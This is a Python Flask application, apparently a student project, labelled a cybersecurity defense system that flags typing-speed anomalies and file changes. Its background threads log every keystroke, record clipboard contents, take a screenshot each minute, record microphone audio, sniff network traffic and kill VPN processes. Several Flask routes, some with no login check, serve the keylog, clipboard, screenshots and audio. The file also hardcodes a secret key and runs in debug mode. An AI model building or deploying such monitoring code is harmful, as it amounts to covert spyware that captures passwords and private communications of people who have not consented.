from datetime import datetime, timedelta
import mimetypes
import subprocess
import time
import smtplib
import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from threading import Lock
import threading
import bcrypt
import cv2
import psutil
from pydub import AudioSegment
from pydub.utils import mediainfo
import os
import hashlib
from pymongo import MongoClient
from pynput.keyboard import Key, Listener
import pyperclip
from flask import Flask, redirect, render_template, request, send_file, jsonify, session, url_for
import requests
from scapy.all import sniff, IP, TCP, UDP
from scapy.all import conf
from pydub import AudioSegment
from pydub.playback import play
import sounddevice as sd
import numpy as np
import shutil
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask import session
import random
import string
from PIL import ImageGrab
import re
from flask import abort
from werkzeug.utils import secure_filename

# Initialize Flask app
app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Replace with a strong secret key

# Initialize Limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["5 per minute"]
)

# Track failed login attempts
failed_attempts = {}

# MongoDB setup - replace with your actual connection string
client = MongoClient('mongodb://localhost:27017/')
db = client.cyberDefense
users_collection = db.users
failed_login_attempts_collection = db.failed_login_attempts

# Paths - use environment variables or config files in production
logs_directory = "logs/"
system_information = os.path.join(logs_directory, "system_info.txt")
clipboard_file = os.path.join(logs_directory, "clipboard.txt")
key_log_file = os.path.join(logs_directory, "key_log.txt")
latest_screenshot_path = "screenshots/screenshot.png"
output_dir = "audio_output"
os.makedirs(output_dir, exist_ok=True)
network_log_file = os.path.join(logs_directory, "network_traffic.txt")
behavior_file = os.path.join(logs_directory, "behavior_baseline.json")
file_hashes_file = os.path.join(logs_directory, "file_hashes.json")

# Email configuration - replace with your actual email config
email_address = "your-email@example.com"
email_password = "your-email-password"
email_interval = 3000

# Global variables
anomaly_detected = False
audio_path = os.path.join(output_dir, 'audio.wav')
email_sent_lock = Lock()
keys = []
key_press_times = []
typing_pattern = []

# Helper functions
def generate_captcha():
    captcha_text = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    session['captcha'] = captcha_text
    return captcha_text

def get_external_ip():
    try:
        response = requests.get("https://api64.ipify.org?format=json", timeout=5)
        return response.json().get("ip")
    except requests.RequestException:
        return None

def is_vpn_running():
    for process in psutil.process_iter(['pid', 'name']):
        if "vpn" in process.info['name'].lower():
            return process.info['pid']
    return None

def kill_vpn():
    vpn_pid = is_vpn_running()
    if vpn_pid:
        try:
            os.kill(vpn_pid, 9)
        except Exception as e:
            print(f"Error terminating VPN: {e}")

def record_audio(duration=60, output_dir="audio_output", filename='audio.wav'):
    global audio_path
    fs = 44100
    audio_path = os.path.join(output_dir, filename)
    print("Recording...")
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
    sd.wait()
    print("Recording finished.")
    
    try:
        audio_segment = AudioSegment(
            recording.tobytes(),
            frame_rate=fs,
            sample_width=recording.dtype.itemsize,
            channels=2
        )
        audio_segment.export(audio_path, format='wav')
        print(f"Audio saved to {audio_path}")
    except Exception as e:
        print(f"Error exporting audio: {e}")

def play_audio(file_path):
    try:
        audio_segment = AudioSegment.from_file(file_path, format="wav")
        play(audio_segment)
    except Exception as e:
        print(f"Error playing audio: {e}")

def block_file(file_path):
    quarantine_dir = "quarantine"
    os.makedirs(quarantine_dir, exist_ok=True)
    
    try:
        if os.path.exists(file_path):
            new_location = os.path.join(quarantine_dir, os.path.basename(file_path))
            shutil.move(file_path, new_location)
            if os.name == 'nt':
                subprocess.run(["attrib", "+R", new_location], check=True)
                subprocess.run(["icacls", new_location, "/deny", "everyone:(W)"], check=True)
            else:
                os.chmod(new_location, 0o400)
            return new_location
        return None
    except Exception as e:
        print(f"Error blocking file {file_path}: {e}")
        return None

def load_baseline():
    try:
        with open(behavior_file, 'r') as f:
            data = f.read().strip()
            if not data:
                return {
                    "typing_speed": {"average": 0.0, "deviation_threshold": 0.2},
                    "clipboard_changes": {"rate": 0.0}
                }
            return json.loads(data)
    except (FileNotFoundError, json.JSONDecodeError):
        return {
            "typing_speed": {"average": 0.0, "deviation_threshold": 0.2},
            "clipboard_changes": {"rate": 0.0}
        }

def save_baseline(baseline):
    with open(behavior_file, "w") as f:
        json.dump(baseline, f)

def update_typing_baseline(typing_speed):
    baseline = load_baseline()
    avg_speed = baseline["typing_speed"]["average"]
    baseline["typing_speed"]["average"] = (avg_speed + typing_speed) / 2.0
    save_baseline(baseline)

def update_clipboard_baseline(changes_per_minute):
    baseline = load_baseline()
    rate = baseline["clipboard_changes"]["rate"]
    baseline["clipboard_changes"]["rate"] = (rate + changes_per_minute) / 2.0
    save_baseline(baseline)

def load_last_email_sent_time(email_type):
    try:
        with open(f'logs/{email_type}_email_sent_time.json', 'r') as f:
            data = json.load(f)
            return data.get('last_sent_time', 0)
    except FileNotFoundError:
        return 0

def save_email_sent_time(current_time, email_type):
    with open(f'logs/{email_type}_email_sent_time.json', 'w') as f:
        json.dump({'last_sent_time': current_time}, f)

def send_alert_email(messages, email_type, time_bound, max_emails=5):
    def send_email():
        with email_sent_lock:
            try:
                with open(f'logs/{email_type}_email_count.json', 'r') as f:
                    email_data = json.load(f)
                    email_count = email_data.get('email_count', 0)
                    last_sent_time = email_data.get('last_sent_time', 0)
            except FileNotFoundError:
                email_count = 0
                last_sent_time = 0
            current_time = time.time()
            if current_time - last_sent_time >= time_bound:
                email_count = 0
            if email_count < max_emails:
                msg = MIMEMultipart()
                msg['From'] = email_address
                msg['To'] = email_address
                msg['Subject'] = f"{email_type.capitalize()} Anomaly Alert"
                body = "\n".join(messages)
                msg.attach(MIMEText(body, 'plain'))
                try:
                    with smtplib.SMTP('smtp.gmail.com', 587, timeout=5) as server:
                        server.starttls()
                        server.login(email_address, email_password)
                        server.send_message(msg)
                        email_count += 1
                        with open(f'logs/{email_type}_email_count.json', 'w') as f:
                            json.dump({'email_count': email_count, 'last_sent_time': current_time}, f)
                except Exception as e:
                    print(f"Email error: {e}")
    threading.Thread(target=send_email).start()

def detect_anomalies_and_notify():
    global anomaly_detected
    anomaly_detected = True
    alert_messages = ["Anomaly detected in typing speed!", "Current speed: 2.5 cps", "Average speed: 3.0 cps"]
    try:
        send_alert_email(alert_messages, "anomaly", 3000)
    except Exception as e:
        print(f"Failed to send email: {e}")

def write_file(keys):
    with open(key_log_file, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_press(key):
    global key_press_times
    key_press_times.append(time.time())
    keys.append(key)

def on_release(key):
    global typing_pattern
    if key == Key.esc:
        return False
    write_file(keys)
    keys.clear()
    if len(key_press_times) > 1:
        duration = key_press_times[-1] - key_press_times[0]
        typing_speed = len(key_press_times) / duration
        typing_pattern.append(typing_speed)
        if len(typing_pattern) > 10:
            average_speed = sum(typing_pattern[-10:]) / 10
            baseline = load_baseline()
            deviation_threshold = baseline["typing_speed"]["deviation_threshold"]
            fixed_threshold = 0.1
            if abs(typing_speed - average_speed) > fixed_threshold:
                alert_messages = [
                    "Anomaly detected in typing speed!",
                    f"Current speed: {typing_speed:.2f} cps",
                    f"Average speed: {average_speed:.2f} cps"
                ]
                send_alert_email(alert_messages, "anomaly", 3000)              
                detect_anomalies_and_notify()
            update_typing_baseline(typing_speed)
            typing_pattern.pop(0)

def monitor_clipboard():
    previous_clipboard_content = ""
    clipboard_changes = 0
    start_time = time.time()
    while True:
        try:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != previous_clipboard_content:
                with open(clipboard_file, "a") as f:
                    f.write(f"{time.ctime()}: {current_clipboard_content}\n")
                previous_clipboard_content = current_clipboard_content
                clipboard_changes += 1
            if time.time() - start_time >= 60:
                update_clipboard_baseline(clipboard_changes)
                clipboard_changes = 0
                start_time = time.time()
            time.sleep(1)
        except Exception as e:
            print(f"Clipboard monitoring error: {e}")

def calculate_hash(file_path):
    try:
        with open(file_path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception as e:
        print(f"Error calculating hash for {file_path}: {e}")
        return None

def scan_directory(directory_path):
    file_hashes = {}
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            file_hash = calculate_hash(file_path)
            if file_hash:
                file_hashes[file_path] = file_hash
    return file_hashes

def load_previous_hashes():
    try:
        with open(file_hashes_file, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_file_hashes(hashes):
    with open(file_hashes_file, 'w') as f:
        json.dump(hashes, f, indent=4)

def capture_screenshots(interval=60):
    screenshots_dir = "screenshots"
    os.makedirs(screenshots_dir, exist_ok=True)
    
    while True:
        screenshot = ImageGrab.grab()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(screenshots_dir, f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_path)
        global latest_screenshot_path
        latest_screenshot_path = screenshot_path
        time.sleep(interval)

def start_screenshot_capture():
    screenshot_thread = threading.Thread(target=capture_screenshots, daemon=True)
    screenshot_thread.start()

def compare_hashes_and_notify(previous_hashes, current_hashes):
    changes_detected = False
    alert_messages = []
    for file_path, current_hash in current_hashes.items():
        if file_path not in previous_hashes:
            alert_messages.append(f"New file detected: {file_path}")
            changes_detected = True
        elif previous_hashes[file_path] != current_hash:
            alert_messages.append(f"File modified: {file_path}")
            changes_detected = True
            blocked_file = block_file(file_path)
            alert_messages.append(f"Blocked file: {blocked_file}")
    if changes_detected:
        send_alert_email(alert_messages, "file_integrity", 3600)

def monitor_files(directory):
    previous_hashes = load_previous_hashes()
    while True:
        current_hashes = scan_directory(directory)
        compare_hashes_and_notify(previous_hashes, current_hashes)
        save_file_hashes(current_hashes)
        time.sleep(60)

def packet_callback(packet):
    global previous_ip
    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        protocol = "TCP" if TCP in packet else "UDP" if UDP in packet else "Other"
        src_port = packet[TCP].sport if TCP in packet else (packet[UDP].sport if UDP in packet else "N/A")
        dst_port = packet[TCP].dport if TCP in packet else (packet[UDP].dport if UDP in packet else "N/A")
        log_entry = f"{time.ctime()} - Protocol: {protocol}, {src_ip}:{src_port} -> {dst_ip}:{dst_port}\n"
        current_ip = get_external_ip()
        if current_ip and previous_ip and current_ip != previous_ip:
            kill_vpn()
            previous_ip = current_ip
        if is_vpn_running():
            kill_vpn()
        with open(network_log_file, "a") as f:
            f.write(log_entry)

def monitor_network(interface=None):
    if interface is None:
        interface = conf.ifaces[0].name
    try:
        sniff(iface=interface, prn=packet_callback, store=False)
    except Exception as e:
        print(f"Error starting network monitor: {e}")

# Flask routes
@app.route('/')
def homepage():
    if 'email' in session:
        return redirect(url_for('index'))
    return render_template('Homepage.html')

@app.route('/login_page')
def login_page():
    if 'email' in session:
        return redirect(url_for('index'))
    return render_template('login_page.html')

@app.route('/captcha')
def captcha():
    from PIL import Image, ImageDraw, ImageFont
    import io
    captcha_text = generate_captcha()
    image = Image.new('RGB', (150, 50), color=(255, 255, 255))
    draw = ImageDraw.Draw(image)
    try:
        font = ImageFont.truetype("arial.ttf", 24)
    except IOError:
        font = ImageFont.load_default()
    draw.text((10, 10), captcha_text, fill=(128, 0, 0), font=font)
    for _ in range(100):
        x = random.randint(0, 150)
        y = random.randint(0, 50)
        draw.point((x, y), fill=(200, 200, 200))
    buf = io.BytesIO()
    image.save(buf, format='PNG')
    buf.seek(0)
    return send_file(buf, mimetype='image/png')

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    email = request.form['email']
    password = request.form['password']
    user_captcha = request.form.get('captcha', '')
    ip_address = request.remote_addr

    if 'captcha' not in session or user_captcha.lower() != session['captcha'].lower():
        return "Invalid CAPTCHA. Please try again.", 400

    if email in failed_attempts and failed_attempts[email] >= 5:
        return "Account locked due to too many failed attempts. Try again later.", 403

    user = users_collection.find_one({'email': email})

    if user:
        stored_password = user['password'].encode('utf-8')
        if bcrypt.checkpw(password.encode('utf-8'), stored_password):
            if email in failed_attempts:
                del failed_attempts[email]
            session['email'] = email
            return redirect(url_for('index'))
        else:
            if email in failed_attempts:
                failed_attempts[email] += 1
            else:
                failed_attempts[email] = 1

            failed_login_attempts_collection.insert_one({
                'email': email,
                'ip_address': ip_address,
                'timestamp': time.time(),
                'attempts': failed_attempts[email]
            })

            if failed_attempts[email] >= 5:
                return "Account locked due to too many failed attempts. Try again later.", 403

            return "Invalid credentials", 401
    else:
        return "User not found", 401

@app.route('/view_failed_attempts')
def view_failed_attempts():
    if 'email' not in session:
        return redirect(url_for('login_page'))
    attempts = list(failed_login_attempts_collection.find({}, {'_id': 0}))
    return jsonify(attempts)

@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    email = request.form['email']
    password = request.form['password']
    confirm_password = request.form['confirm_password']

    if password != confirm_password:
        return "Passwords do not match", 400

    if not re.match(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$', password):
        return "Password must contain at least 8 characters, one uppercase, one lowercase, one number, and one special character", 400

    if users_collection.find_one({'email': email}):
        return "User already exists", 400

    salt = bcrypt.gensalt()
    hashed_password = bcrypt.hashpw(password.encode('utf-8'), salt)

    users_collection.insert_one({
        'username': username,
        'email': email,
        'password': hashed_password.decode('utf-8'),
        'salt': salt.decode('utf-8')
    })

    return redirect(url_for('login_page'))

@app.route('/index')
def index():
    if 'email' in session:
        user = users_collection.find_one({'email': session['email']})
        if user:
            username = user.get('username', 'User')
            return render_template('index.html', username=username)
    return redirect(url_for('login_page'))
   
@app.route('/logout')
def logout():
    session.pop('email', None)
    return redirect(url_for('homepage'))
   
@app.route('/verification', methods=['GET', 'POST'])
def verification():
    global anomaly_detected
    
    if 'verification_start_time' not in session:
        session['verification_start_time'] = datetime.now().timestamp()
    
    time_elapsed = datetime.now().timestamp() - session['verification_start_time']
    if time_elapsed > 30:
        session.pop('verification_start_time', None)
        return redirect(url_for('access_denied'))
    
    if request.method == 'POST':
        answers = {
            'question1': 'X7',
            'question2': 'kE',
            'question3': 'k9Lm'
        }
        user_answers = {
            'question1': request.form['question1'],
            'question2': request.form['question2'],
            'question3': request.form['question3']
        }
        
        if all(user_answers[q] == answers[q] for q in answers):
            session['verified'] = True
            session.pop('verification_start_time', None)
            anomaly_detected = False
            return redirect(url_for('index'))
        else:
            session.pop('verification_start_time', None)
            return redirect(url_for('access_denied'))
    
    return render_template('verification.html')

@app.route('/access_denied')
def access_denied():
    session.pop('verification_start_time', None)
    session.pop('verification_needed', None)
    session.pop('verified', None)
    return render_template('access_denied.html')

@app.before_request
def check_verification():
    global anomaly_detected
    
    if request.endpoint in ['static', 'verification', 'access_denied']:
        return
    
    if anomaly_detected and not session.get('verified'):
        if 'verification_start_time' in session:
            time_elapsed = datetime.now().timestamp() - session['verification_start_time']
            if time_elapsed > 30:
                session.pop('verification_start_time', None)
                return redirect(url_for('access_denied'))
        
        session['verification_needed'] = True
        return redirect(url_for('verification'))
    
@app.route('/best-practices')
def best_practices():
    return render_template('best-practices.html')

@app.route('/behavior')
def view_behavior():
    return jsonify(load_baseline())

@app.route('/screenshot')
def view_screenshot():
    return send_file(latest_screenshot_path, as_attachment=False)

@app.route('/record_audio', methods=['POST'])
def record_audio_route():
    record_audio(duration=60)
    return jsonify({"message": "Audio recorded successfully."})

@app.route('/download_audio', methods=['GET'])
def download_audio():
    return send_file(audio_path, as_attachment=True)

@app.route('/system_info')
def view_system_info():
    return send_file(system_information, as_attachment=False)

@app.route('/clipboard')
def view_clipboard():
    return send_file(clipboard_file, as_attachment=False)

@app.route('/keylog')
def view_keylog():
    return send_file(key_log_file, as_attachment=False)

@app.route('/network')
def view_network_logs():
    return send_file(network_log_file, as_attachment=False)

@app.route('/logger')
def logger():
    return render_template('logger.html')

# Background Task Initialization
def start_background_tasks():
    threading.Thread(target=record_audio, daemon=True).start()
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=monitor_files, args=("directory_to_monitor",), daemon=True).start()
    threading.Thread(target=monitor_network, args=(None,), daemon=True).start()
    threading.Thread(target=start_screenshot_capture, daemon=True).start()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Starting Cybersecurity Defense System...")
    threading.Thread(target=start_background_tasks, daemon=True).start()
    app.run(debug=True)